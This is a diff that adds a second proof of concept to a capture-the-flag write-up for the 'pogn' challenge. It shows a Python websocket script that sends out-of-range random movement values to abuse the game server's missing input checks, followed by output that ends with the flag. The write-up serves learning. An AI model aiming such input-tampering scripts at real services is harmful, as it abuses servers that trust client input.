@@ -240,3 +240,57 @@ hits a score of 100
                       if "lactf" in resp:                                                         n   
                           exit()
                                                                                                                                 asyncio.get_event_loop().run_until_complete(connect_to_websocket())
+
+### Another proof of concept with random.randint() 
+
+- Script
+
+      #! /usr/bin/env python3
+      import websockets
+      import asyncio
+      import json
+      import random
+      async def connect_to_websocket():
+            uri = "ws://pogn.chall.lac.tf/ws"
+            async with websockets.connect(uri) as websocket:
+                for i in range(-10000,10000):
+                      resp = await websocket.recv()
+                      print("[+]First resp:"+resp)
+                      value: str = json.dumps([2,[[random.randint(-10000,-1000),random.randint(-10000,-1000)],[random.randint(-10000,-1000),random.randint(-10000,-1000)]]])
+                      print("[+]Value:"+value)
+                      await websocket.send(value)
+                      resp =await websocket.recv()
+                      print(f"[+]2nd resp: {resp}\n")
+                      if "lactf" in resp:
+                          exit()
+      
+      asyncio.get_event_loop().run_until_complete(connect_to_websocket())
+
+- Flag
+
+           
+        [+]First resp:[0,[[17.281644510413656,0],[95,0]]]
+        [+]Value:[2, [[-4322, -3724], [-4664, -8141]]]
+        [+]2nd resp: [0,[[15.416865451772463,0],[95,0]]]
+        
+        [+]First resp:[0,[[13.589381974304093,0],[95,0]]]
+        [+]Value:[2, [[-9388, -1001], [-6070, -3877]]]
+        [+]2nd resp: [0,[[11.687307334490075,0],[95,0]]]
+        
+        [+]First resp:[0,[[9.859823857021706,0],[95,0]]]
+        [+]Value:[2, [[-5284, -2671], [-6756, -1912]]]
+        [+]2nd resp: [0,[[7.957749217207688,0],[95,0]]]
+        
+        [+]First resp:[0,[[6.092970158566494,0],[95,0]]]
+        [+]Value:[2, [[-6226, -6734], [-9013, -9412]]]
+        [+]2nd resp: [0,[[4.228191099925301,0],[95,0]]]
+        
+        [+]First resp:[0,[[4.362255239503406,0],[95,0]]]
+        [+]Value:[2, [[-2484, -7046], [-6317, -6854]]]
+        [+]2nd resp: [0,[[69.96414953658957,0],[95,0]]]
+        
+        [+]First resp:[2,"omg u won, i guess you considered getting better here is a flag: lactf{7_supp0s3_y0u_g0t_b3773r_NaNaNaN}",[[135.56604383367574,0],[95,0]]]
+        [+]Value:[2, [[-4512, -8281], [-4371, -8529]]]
+        
+
+ 
